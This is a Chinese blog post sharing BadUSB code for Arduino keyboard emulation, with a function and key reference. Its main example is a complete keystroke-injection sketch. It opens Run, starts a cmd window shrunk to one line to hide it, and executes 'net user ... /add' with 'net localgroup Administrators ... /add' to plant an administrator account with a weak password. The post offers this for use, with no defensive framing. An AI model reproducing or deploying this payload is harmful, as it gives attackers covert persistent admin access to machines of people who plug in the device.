---
title: badusb-代码篇
date: 2021-02-20 19:53:14
urlname: badusb
categories: 
	- 硬件开发
tags: 
    - Badusb
---

#### badusb代码介绍及分享

建议先在虚拟机测试，有些badusb恶意代码会使你的电脑系统受损，badusb对linux系统无效，如将badusb循环执行 Alt +F4 关闭窗口则无法在windows烧写，这时候就可以使用Linux版的Arduino进行烧写（树莓派等）。更多badusb代码可上[github](https://github.com/) 查看

[编写软件](https://www.arduino.cc/en/software)

#### 添加用户示例代码：

```bash
#include <Keyboard.h>
void setup() {
  // 这里执行一次
  Keyboard.begin();//开始键盘通讯 
  delay(2000);//初始化时间
  Keyboard.press(KEY_LEFT_GUI); //点击win键
  delay(50); //延迟执行时间
  Keyboard.press('r'); //点击r键
  delay(50);
  Keyboard.release(KEY_LEFT_GUI); //释放win键
  Keyboard.release('r'); //释放r键
  delay(50);
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1"); //打开cmd并将串口最小化
  delay(100);
  Keyboard.press(KEY_RETURN); //回车
  Keyboard.release(KEY_RETURN); //释放回车
  delay(50);
  Keyboard.println("net user test 123456 /add&net localgroup Administrators test /add"); //添加test用户
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.println("exit");
  delay(50);
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.end();//结束键盘通讯 
}
 
 
void loop() {
  // 这里循环执行
 
}
```



#### 按键介绍

```bash
delay(5000);//延时毫秒
 
Keyboard.begin();     //开始键盘通讯
Keyboard.end();     //结束键盘通讯
Keyboard.press();     //按下键盘按键     如果是非特殊按键如 数字、字母按键用单引号括起来
Keyboard.release();     //释放键盘按键
Keyboard.println("");     //输入字符串使用双引号括起来
 
 
Mouse.begin();//鼠标事件开始
Mouse.click();//鼠标单击
Mouse.end();//鼠标事件结束
Mouse.move();//鼠标移动(x,y)
Mouse.press();//鼠标按下
Mouse.release();//鼠标松开
Mouse.isPressed();// 
 
 
KEY_LEFT_CTRL
KEY_LEFT_SHIFT
KEY_LEFT_ALT
KEY_LEFT_GUI    //win键
KEY_RIGHT_CTRL
KEY_RIGHT_SHIFT
KEY_RIGHT_ALT
KEY_RIGHT_GUI
KEY_UP_ARROW
KEY_DOWN_ARROW
KEY_LEFT_ARROW
KEY_RIGHT_ARROW
KEY_BACKSPACE
KEY_TAB
KEY_RETURN//回车键
KEY_ESC
KEY_INSERT
KEY_DELETE
KEY_PAGE_UP
KEY_PAGE_DOWN
KEY_HOME
KEY_END
KEY_CAPS_LOCK
KEY_F1
KEY_F2
KEY_F3
KEY_F4
KEY_F5
KEY_F6
KEY_F7
KEY_F8
KEY_F9
KEY_F10
KEY_F11
KEY_F12
```

